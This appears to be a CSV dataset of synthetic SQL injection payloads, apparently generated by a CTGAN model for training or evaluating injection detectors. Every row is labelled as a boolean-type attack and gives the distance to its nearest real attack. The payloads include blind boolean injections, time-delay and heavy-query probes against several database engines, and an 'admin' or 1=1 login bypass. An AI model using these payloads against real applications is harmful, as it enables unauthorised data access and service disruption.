id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000414,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",nearest_attack_euclidean,R000333,5.139868009502874
CTGAN_000415,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R001155,4.12472488969581
CTGAN_000416,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R001516,5.851637055497107
CTGAN_000417,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R001405,6.745679243113479
CTGAN_000418,attack,boolean,"-6014"" or make_set  (  3003  =  2609,2609  )  ",nearest_attack_euclidean,R001062,4.371239433652452
CTGAN_000419,attack,boolean,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000766,6.5021767339386445
CTGAN_000420,attack,boolean,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000896,5.77173371580335
CTGAN_000421,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,5.194413116318187
CTGAN_000422,attack,boolean,"1'  )   as afnt where 4719  =  4719 and elt  (  8224  =  1275,1275  )  --",nearest_attack_euclidean,R000748,4.8028792416560915
CTGAN_000423,attack,boolean,"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000212,6.165186190529523
CTGAN_000424,attack,boolean,"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R001555,5.1943030967632415
CTGAN_000425,attack,boolean,-9660   )    )    or 9762  =  9698,nearest_attack_euclidean,R001493,5.926772541899768
CTGAN_000426,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711",nearest_attack_euclidean,R000927,6.775264150012551
CTGAN_000427,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001321,5.372965532900372
CTGAN_000428,attack,boolean,"1   )    )    as faxr where 7972  =  7972 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000662,6.484043875414915
CTGAN_000429,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R001155,3.8966445534767287
CTGAN_000430,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001361,8.777311265411711
CTGAN_000431,attack,boolean,"-7528' or make_set  (  3809  =  1821,1821  )   and 'kgch'  =  'kgch",nearest_attack_euclidean,R000515,3.3622090460776834
CTGAN_000432,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000415,5.657447683559073
CTGAN_000433,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'skdy'  =  'skdy",nearest_attack_euclidean,R000780,5.520960537760881
CTGAN_000434,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001450,5.332404430371198
CTGAN_000435,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R001155,4.150276472614406
CTGAN_000436,attack,boolean,"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",nearest_attack_euclidean,R001095,6.427968289711827
CTGAN_000437,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  3876  =  2077  )   then 1 else 0x28 end   )    )    and    (    (   'hqcz' like 'hqcz,nearest_attack_euclidean,R001219,6.497444601385205
CTGAN_000438,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537",nearest_attack_euclidean,R000786,5.99231445863866
CTGAN_000439,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000563,4.443737445376838
CTGAN_000440,attack,boolean,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa",nearest_attack_euclidean,R001145,5.215584448019495
CTGAN_000441,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000415,6.217807851928771
CTGAN_000442,attack,boolean,"1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000866,5.667264818368547
CTGAN_000443,attack,boolean,-8224'  )   where 6504  =  6504 or 2461  =  5660,nearest_attack_euclidean,R000520,4.450814120800849
CTGAN_000444,attack,boolean,"-4327"" or make_set  (  3107  =  1781,1781  )   and ""lclf"" like ""lclf",nearest_attack_euclidean,R000864,4.2542402734530675
CTGAN_000445,attack,boolean,"-6254"" where 8941  =  8941 or elt  (  1032  =  1032,3623  )  --",nearest_attack_euclidean,R001052,4.019040257435756
CTGAN_000446,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'squj'  =  'squj",nearest_attack_euclidean,R001273,4.991770304904095
CTGAN_000447,attack,boolean,1'||  (  select 'hshf' where 9073  =  9073 and 7533  =  7533  )  ||',nearest_attack_euclidean,R000867,5.1705534420577015
CTGAN_000448,attack,boolean,-2307'   )    )     )   or 6872  =  6872 and    (    (     (  'fyok' like 'fyok,nearest_attack_euclidean,R000225,4.8213982339776
CTGAN_000449,attack,boolean,1'  )   where 5287  =  5287 and 7533  =  7533--,nearest_attack_euclidean,R000999,6.307717509389585
CTGAN_000450,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R000396,3.7524109824815137
CTGAN_000451,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001321,6.343367827082838
CTGAN_000452,attack,boolean,1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',nearest_attack_euclidean,R000588,5.307857930521384
CTGAN_000453,attack,boolean,"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000904,5.693751321478337
CTGAN_000454,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R000396,5.42636526449342
CTGAN_000455,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R001358,6.052735609673215
CTGAN_000456,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,4.2854139203479
CTGAN_000457,attack,boolean,1' and 1661  =  1244 and 'dcha'  =  'dcha,nearest_attack_euclidean,R000575,5.582690190038925
CTGAN_000458,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000810,7.594878798308438
CTGAN_000459,attack,boolean,"-4408""  )   or 6872  =  6872 and   (  ""oenu""  =  ""oenu",nearest_attack_euclidean,R001344,4.437410726085006
CTGAN_000460,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi,nearest_attack_euclidean,R000950,5.154340764196162
CTGAN_000461,attack,boolean,"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",nearest_attack_euclidean,R000196,3.7479556837619397
CTGAN_000462,attack,boolean,-6813   )    )     )   or 6872  =  6872 and    (    (     (  7304  =  7304,nearest_attack_euclidean,R000775,5.908036096184992
CTGAN_000463,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",nearest_attack_euclidean,R000448,5.338953606135974
CTGAN_000464,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000429,6.925087905824387
CTGAN_000465,attack,boolean,"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000430,4.116830013076235
CTGAN_000466,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R000697,4.163637672781118
CTGAN_000467,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000309,4.635865422630444
CTGAN_000468,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000894,5.330602645932606
CTGAN_000469,attack,boolean,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R000769,5.344868059179834
CTGAN_000470,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R000396,5.48593933116551
CTGAN_000471,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  3876  =  2077  )   then 1 else 0x28 end   )    )    and    (    (   'hqcz' like 'hqcz,nearest_attack_euclidean,R001219,3.5833753430986297
CTGAN_000472,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",nearest_attack_euclidean,R001339,5.402253155907891
CTGAN_000473,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,nearest_attack_euclidean,R000516,3.5784556970589625
CTGAN_000474,attack,boolean,1'  )   where 8086  =  8086 and 1430  =  7941--,nearest_attack_euclidean,R001499,6.113823793219254
CTGAN_000475,attack,boolean,1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',nearest_attack_euclidean,R000190,4.876921730174887
CTGAN_000476,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'zetf'  =  'zetf",nearest_attack_euclidean,R000446,6.240833851236215
CTGAN_000477,attack,boolean,"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",nearest_attack_euclidean,R001001,4.056836393261317
CTGAN_000478,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R001492,4.26853655140373
CTGAN_000479,attack,boolean,1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,nearest_attack_euclidean,R000559,3.221136270052324
CTGAN_000480,attack,boolean,-3535%'   )    )     )   or 5605  =  4660 and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000952,6.352215096714159
CTGAN_000481,attack,boolean,"1"" where 1618  =  1618 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001505,6.126813699730976
CTGAN_000482,attack,boolean,"1""   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ddun""  =  ""ddun",nearest_attack_euclidean,R000680,6.713262956597202
CTGAN_000483,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R001540,3.7153146693295263
CTGAN_000484,attack,boolean,"1' where 4417  =  4417 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000506,6.1799090896840365
CTGAN_000485,attack,boolean,-6178   )    )    as lygb where 9559  =  9559 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R001351,3.298422311934413
CTGAN_000486,attack,boolean,1'  )   and 7290  =  8416 and   (  'ktlz' like 'ktlz,nearest_attack_euclidean,R000455,4.443093386497027
CTGAN_000487,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",nearest_attack_euclidean,R001558,4.740707876990837
CTGAN_000488,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001174,5.150677373991678
CTGAN_000489,attack,boolean,admin' or 1  =  1#,nearest_attack_euclidean,R000001,5.116121503175013
CTGAN_000490,attack,boolean,-7758%'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000220,5.7507273159924495
CTGAN_000491,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",nearest_attack_euclidean,R000770,5.436556312060567
CTGAN_000492,attack,boolean,"1""   )    )    and 7533  =  7533 and    (    (   ""rnni"" like ""rnni",nearest_attack_euclidean,R000224,4.360496145802009
CTGAN_000493,attack,boolean,1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,nearest_attack_euclidean,R000413,9.682967229507195
CTGAN_000494,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R001495,6.160413931542417
CTGAN_000495,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000696,3.8587695285455266
CTGAN_000496,attack,boolean,"1' where 7353  =  7353 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000439,6.317452808125593
CTGAN_000497,attack,boolean,"1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R000122,6.563176516420311
CTGAN_000498,attack,boolean,-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,nearest_attack_euclidean,R000171,4.015429734484403
CTGAN_000499,attack,boolean,1   )    )    as wrhe where 6120  =  6120 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000684,6.433988834034667
CTGAN_000500,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,nearest_attack_euclidean,R000516,5.605281504428726
